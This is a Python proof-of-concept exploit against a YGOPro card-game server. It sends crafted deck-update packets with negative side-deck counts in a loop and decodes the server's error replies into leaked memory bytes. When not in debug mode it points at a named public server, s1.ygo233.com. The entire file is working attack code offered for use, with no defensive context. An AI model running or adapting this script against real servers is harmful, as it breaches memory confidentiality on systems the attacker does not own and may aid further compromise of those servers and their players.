#coding=utf-8

import network
import struct
import threading
import time

DEBUG = 1

if DEBUG:
    ygo_server_addr = '169.254.163.123'
    ygo_server_port = 7911
else:
    ygo_server_addr = 's1.ygo233.com'
    ygo_server_port = 233
config = (ygo_server_addr, ygo_server_port)

def leak_callback_func(length, proto, data):
    if proto == 'STOC_ERROR_MSG':
        num = struct.unpack('<I', data[4:])[0]
        if num == 1610612737:
            memory = struct.pack('<i', 0)
        else:
            DECKERROR_UNKNOWNCARD = 0x4 << 28
            memory = struct.pack('<i', num-DECKERROR_UNKNOWNCARD) if num-DECKERROR_UNKNOWNCARD < 0 else struct.pack('<I', num-DECKERROR_UNKNOWNCARD)
            print('[*] memory: {}'.format(memory))

def leak_ygo_memory():
    lock = threading.Lock()
    ygo_handle = network.ygo_handle(
        *config,
        t_lock=lock,
        name='leak_memory',
        )
    ygo_handle.callback_func = leak_callback_func

    ygo_handle.start()
    ygo_handle.send_package(num=0, control=False)
    ygo_handle.send_package(num=1, control=False)
    for i in range(1,100000):
        mainc = i
        sidec = -i
        cards = [46104361, 46104361]     # 2张电子界白帽客
        deck_buf = struct.pack('<ii', mainc, sidec)
        for card in cards:
            deck_buf += struct.pack('<i', card)
        ygo_handle.send_CTOS_UPDATE_Deck(deck=deck_buf)
        ygo_handle.send_package(num=3, control=False)
        time.sleep(0.01)

if __name__ == ('__main__'):
    leak_ygo_memory()
